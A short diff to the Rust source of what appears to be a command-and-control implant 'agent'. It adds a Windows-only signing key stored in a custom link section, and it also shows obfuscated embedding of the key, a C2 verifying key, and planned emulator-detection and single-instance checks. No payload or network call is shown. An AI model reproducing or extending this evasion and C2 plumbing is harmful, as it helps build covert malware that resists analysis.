@@ -79,6 +79,11 @@ mod platform;
 
 type AgentResult<T> = Result<T, error::AgentError>;
 
+#[cfg(windows)]
+#[link_section = "secret_key"]
+#[used]
+static mut SECRET_KEY: [u8; crypto::ED25519_SECRET_KEY_SIZE] = [0; crypto::ED25519_SECRET_KEY_SIZE];
+
 fn failsafe_loop(
     signing_key: &mut crypto::SigningKey,
     c2_verifying_key: &crypto::VerifyingKey,
@@ -140,7 +145,12 @@ fn main() -> AgentResult<()> {
     let agent_path = env::current_exe()?;
 
     // TODO is_emu
+    // TODO Single instance
 
+    #[cfg(windows)]
+    #[allow(static_mut_refs)]
+    let mut signing_key = crypto::get_signing_key_from(unsafe { &SECRET_KEY });
+    #[cfg(not(windows))]
     let mut signing_key = crypto::get_signing_key_from(obfstr::obfbytes!(include_bytes!(concat!(
         env!("OUT_DIR"),
         "/id.key"
